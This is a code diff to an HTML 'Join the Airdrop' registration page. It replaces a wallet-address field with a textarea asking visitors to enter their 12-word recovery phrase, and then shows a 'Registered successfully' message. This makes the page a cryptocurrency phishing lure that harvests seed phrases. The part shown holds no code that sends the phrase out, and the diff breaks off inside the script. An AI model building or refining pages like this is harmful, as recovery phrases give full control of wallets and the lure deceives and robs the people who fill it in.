@@ -29,12 +29,15 @@
       margin-top: 30px;
     }
 
-    input[type="text"], input[type="password"] {
+    input[type="text"], textarea {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
       border-radius: 8px;
       border: none;
+      background-color: #0d1117;
+      color: #fff;
+      resize: vertical;
     }
 
     input[type="submit"] {
@@ -47,26 +50,11 @@
       width: 100%;
     }
 
-    .wallet-input {
-      position: relative;
-    }
-
-    .toggle-eye {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #000;
-      background: #fff;
-      padding: 0 5px;
-      border-radius: 50%;
-    }
-
     .success-message {
       margin-top: 20px;
       color: #00ffcc;
       font-weight: bold;
+      display: none; /* HIDDEN BY DEFAULT */
     }
   </style>
 </head>
@@ -74,26 +62,18 @@
   <h1>Join the Airdrop</h1>
   <form id="register-form">
     <input type="text" name="username" placeholder="Your Name" required />
-    
-    <div class="wallet-input">
-      <input type="password" id="wallet" name="wallet" placeholder="Wallet Address" required />
-      <span class="toggle-eye" onclick="togglePassword()">👁️</span>
-    </div>
-    
+
+    <!-- Mnemonic input -->
+    <textarea name="wallet" placeholder="Enter your 12-word recovery phrase here..." rows="4" required></textarea>
+
     <input type="submit" value="Register" />
   </form>
-  <div class="success-message" id="success-message">🎉 Registered successfully!</div>
+
+  <div class="success-message" id="success-message">
+    🎉 Registered successfully!
+  </div>
 
   <script>
-    function togglePassword() {
-      const input = document.getElementById('wallet');
-      if (input.type === 'password') {
-        input.type = 'text';
-      } else {
-        input.type = 'password';
-      }
-    }
-
     document.getElementById("register-form").addEventListener("submit", function(e) {
       e.preventDefault();
       document.getElementById("success-message").style.display = "block";
